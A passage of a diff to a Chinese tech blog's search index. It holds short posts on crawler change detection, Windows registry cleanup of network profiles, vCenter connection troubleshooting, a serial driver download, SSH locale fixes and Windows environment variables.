+<li>一些文件也许仅仅改变了修改时间，内容并没有改变</li>
+<li><strong>If-Modified-Since</strong> 的检查粒度是秒级的，无法做到更精确的检查</li>
+<li>服务器无法控制</li>
+</ul>
+<p>支持 <strong>Etag</strong> 的服务器会像返回 <strong>Last-Modified</strong> 那样返回一个<strong>Etag</strong> 字符串，客户端请求时根据需要在请求头的 <strong>If-Match</strong> 或 <strong>If-None-Match</strong>（更常用）字段中放入上次请求得来的 <strong>Etag</strong> 字符串，然后服务器会根据 <strong>Etag</strong> 作出与 <strong>If-Modified-Since</strong> 同样的响应。</p>
+<p>这种方法的最大问题就是服务器不一定支持。<strong>Etag</strong> 本身也是服务器根据一定规则计算出来的，有计算就有性能消耗，就看服务器愿不愿意支持了。</p>
+<hr>
+<h3 id="基于页面地址的比较"><a href="#基于页面地址的比较" class="headerlink" title="基于页面地址的比较"></a>基于页面地址的比较</h3><p>在本次爬取后，保存爬取的 URL，一段时间内爬过的就不用再爬了。如果页面 URL 中有诸如 ID 之类的参数的话，可以使用 ID，因为 ID 在后端中通常是唯一的。经常与 <strong>定时爬取</strong> 配合使用。</p>
+<hr>
+<h3 id="基于页面内容的比较"><a href="#基于页面内容的比较" class="headerlink" title="基于页面内容的比较"></a>基于页面内容的比较</h3><p>在本次爬取后，抽取页面关键元素的内容计算 MD5 并保存，下次爬取时比较 MD5 判断是否更新。如果关键内容不多的话，也可以不做 MD5 直接保存。</p>
+<p>不建议直接保存整个页面全部内容或其 MD5，因为如果页面中有 <em>本站已运行 xx 时间、访客：xx</em> 之类不断更新的内容，就会造成误判。</p>
+]]></content>
+      <tags>
+        <tag>爬虫</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows10 删除多余的网络配置项</title>
+    <url>/2017/03/24/win10-delete-network-config/</url>
+    <content><![CDATA[<p>1.Win + R 运行，输入 <strong>regedit</strong>，打开注册表编辑器<br>2.找到下面两个键</p>
+<blockquote>
+<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\NetworkList\Profiles</p>
+</blockquote>
+<blockquote>
+<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\NetworkList\Signatures\Unmanaged</p>
+</blockquote>
+<p>3.在这两个键的下面有一堆 Hash 值命名的目录</p>
+<a id="more"></a>
+<p><img src="https://ooo.0o0.ooo/2017/03/24/58d476ba75381.png" alt="snipaste20170324_092802.png"></p>
+<p>不需要哪个删除就是了</p>
+<p>可以根据目录里面 <strong>ProfileName</strong> 的值来判断这个目录是属于哪个网络配置的<br><img src="https://ooo.0o0.ooo/2017/03/24/58d476ba4185f.png" alt="2.png"></p>
+<p>同样，如果需要修改网络配置的名字，也可以从这里修改 <strong>ProfileName</strong> 的值</p>
+<p>修改注册表有一定风险，请一定要仔细</p>
+]]></content>
+      <tags>
+        <tag>Windows</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vShere Client 无法连接 vCenter 故障排查思路</title>
+    <url>/2017/07/14/vsphere-server-problem-check/</url>
+    <content><![CDATA[<p>问题如图所示，vSphere Client 弹框无法连接到 vCenter，只提示出现未知错误<br><img src="https://ooo.0o0.ooo/2017/07/14/5968a5d706d37.jpg" alt></p>
+<p>这类问题一般不好排查，因为没有给出错误的具体信息，错误提示或者错误代码。我这里结合实例，总结一下该类问题的排查思路</p>
+<a id="more"></a>
+
+<p><strong>1. 检查网络连接情况；检查 vCenter 的 IP，用户名，密码是否正确</strong></p>
+<blockquote>
+<p>这个在大多数出现在实验环境中，生产环境中一般不会出现这种错误<br>解决办法也没什么好说的，ping 检查连接，用户名密码换成正确的</p>
+</blockquote>
+<p><strong>2. 检查 vCenter 的 Web Client 能否正常访问</strong></p>
+<blockquote>
+<p>vCenter 是可以从 Web 端访问管理的<br>URL 是：<a href="https://client-hostname:port/vsphere-client" target="_blank" rel="noopener">https://client-hostname:port/vsphere-client</a><br>默认情况下此端口为 9443，但可在 vSphere Web Client 安装过程中更改此端口</p>
+</blockquote>
+<p>这里打开并输入正确的用户名密码，发现可以正常访问，说明 vCenter 整个本身是没有什么问题的</p>
+<p><strong>3. 检查 VMware VirtualCenter Server 服务是否已经启动</strong></p>
+<blockquote>
+<p>VMware VirtualCenter Server 是 vCenter 的核心服务，无法连接的原因大部分是因为这个服务没有启动<br>使用 <strong>远程桌面</strong> 连接到 vCenter 所在的虚拟机，打开 <strong>服务器管理器 - 诊断 - 服务</strong>，找到这个服务，检查其状态</p>
+</blockquote>
+<p>我所在的环境是一个 vCenter 虚拟机通过 Platform Services Controller 去管理多个安装了 VMWare ESXi 底机。由于所在环境出于安全起见，在 vCenter Server 安装时禁止了 vCenter 虚拟机的远程桌面权限，所以这里采用另一种方式跳转上去</p>
+<p>由于 VMWare ESXi 底机是允许通过 vSphere Client 连接去管理单个的实体服务器的，而这种方式不需要依赖 VMware VirtualCenter Server 服务。所以我这里先连接 vCenter 虚拟机所在的那台实体服务器，再在其中打开控制台</p>
+<p>打开后检查，发现这个服务确实是没有正常启动<br><img src="https://i.loli.net/2017/07/14/5968b6b4dfdaf.png" alt="2.png"></p>
+<p><strong>4. VMware VirtualCenter Server 服务无法正常启动</strong></p>
+<blockquote>
+<p>一般来说，若是该服务没有启动，手动启用后便可恢复正常。但有些情况下无法手动启动，这时候就要结合具体情况来分析了<br>vCenter Server 的正常运行是需要依赖数据库的，所以先应该检查数据库的相关服务有没有正常运行<br>vCenter Server 在安装时是会将其核心服务设置为开机自启的。所以，如果在其启动时数据库服务没有正常运行，就会出现问题。我习惯的做法是将数据库相关服务的启动类型设置为 <strong>自动</strong>，而把 vCenter Server 相关服务设置为 <strong>自动（延迟启动）</strong>，来保证数据库服务优于 vCenter Server 服务启动。</p>
+</blockquote>
+<p><strong>5. VMware VirtualCenter Server 服务正常启动了还是不能连接</strong></p>
+<blockquote>
+<p>通常情况下，vCenter Server，vCenter 依赖的数据库和其他业务服务都是分开机器安装的，但也有安装在一台虚拟机中的情况<br>因为 vCenter Server 需要使用 80 端口，所以保证该端口的正常通信是必要的。可以使用 telnet 命令来检查端口是否已经开启，例如 telnet 10.100.100.14 80。如果不通，就要检查各防火墙的出入栈规则了<br>另外 Web 服务也会占用 80 端口来进行通信，这个也要仔细甄别</p>
+</blockquote>
+<p>关于 vCenter 服务的相关问题实在太多，这里只是整理了一些思路来帮助检查<br>对于这种问题没有什么好办法，就是查看日志来找问题原因。</p>
+]]></content>
+      <tags>
+        <tag>网络</tag>
+        <tag>vSphere</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows10 USB-To-Console 串口驱动 (x86 x64)</title>
+    <url>/2017/02/28/win10-usb-to-console/</url>
+    <content><![CDATA[<p>最近将 Win10 更新到 14393，之前的 USB 转串口线一插上就蓝屏重启，费了好多功夫 Google 到了之前版本的驱动，试了试居然没事了，这里就分享下吧</p>
+<p>下载地址：<a href="http://pan.baidu.com/s/1gfIb96r" target="_blank" rel="noopener">百度网盘</a></p>
+<p>Step1. 进入 Step1 文件夹，安装 Setup.exe。如果成功，则无需进行第二步了。</p>
+<p>Step2. 进入 Step2 文件夹，安装 CH341SER.EXE。不行的话再安装 HL-340.EXE。</p>
+<p>Windows10 专业版 x64 测试通过。</p>
+]]></content>
+      <tags>
+        <tag>网络</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>解决 Xshell SSH 连接 Linux 中文乱码</title>
+    <url>/2017/04/29/xshell-ssh-chinaese-utf8/</url>
+    <content><![CDATA[<h2 id="0x0"><a href="#0x0" class="headerlink" title="0x0"></a>0x0</h2><p>首先需要确保你的 Xshell 的连接编码是 UTF-8。<br>虽然可以修改 Linux 端的字符集去迎合 Windows 端做到中文的正常显示，但在当前 I18N 的大环境下，还是尽量用 UTF-8 吧。</p>
+<p>打开 Xshell 的会话属性窗口，在左边选择到 <strong>终端</strong>，编码一项内，如果不是 Unicode 的话请改成 Unicode</p>
+<a id="more"></a>
+<p><img src="https://ooo.0o0.ooo/2017/04/15/58f1eda7c1d25.png" alt="1.png"></p>
+<h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p>不出意外的话，重新连接你的 SSH 应该已经能正常显示中文了，因为大部分 Linux 的默认连接编码就是 UTF-8 的。</p>
+<p>如果还是不能正常显示，你需要这样做<br>修改 <strong>/etc/profile</strong> 这个文件<br>在其中添加</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> LC_ALL=<span class="string">"zh_CN.UTF-8"</span></span><br></pre></td></tr></table></figure>
+
+<p>这条命令的意思是设置 Locale 为 UTF-8，会在用户初始化时执行</p>
+<p>重启系统，这里中文已经能正常显示了<br><img src="https://ooo.0o0.ooo/2017/04/15/58f1eec23e82d.png" alt="2.png"></p>
+]]></content>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows 环境变量的设置是否需要重启</title>
+    <url>/2016/12/25/windows-set-env-variable/</url>
+    <content><![CDATA[<p>最近从 Android Studio 导入一个项目，提示需要配置一个叫 ANDROID_SDK_HOME 的环境变量，然而 Google 的提示是建议我配置完之后重启，但是我实测配置之后没有重启也生效了，这是怎么回事呢？</p>
+<p>原来，环境变量就是属于 Windows 系统的一些预定义好的变量，其中分为用户变量和系统变量。用户变量只对当前设置环境变量的这个用户生效，系统变量则对整个系统生效。这些变量在用户登录时被设置，应用到系统里，对系统里运行的每一个程序都生效。</p>
+<p>在一个程序启动的时候，它所可以读取的环境变量就会被复制到它所在的环境中。也就是说，每个程序在运行时都会拥有原始环境变量的一份复制体，不会受其他程序的影响。</p>
+<p>所以结果就是，只要重新运行该程序，程序就会重新读取系统的环境变量，环境变量也就发生改变了。而如果修改的是系统要使用的环境变量，也就必须重启系统了。</p>
+]]></content>
+      <tags>
+        <tag>Windows</tag>
       </tags>
   </entry>
 </search>
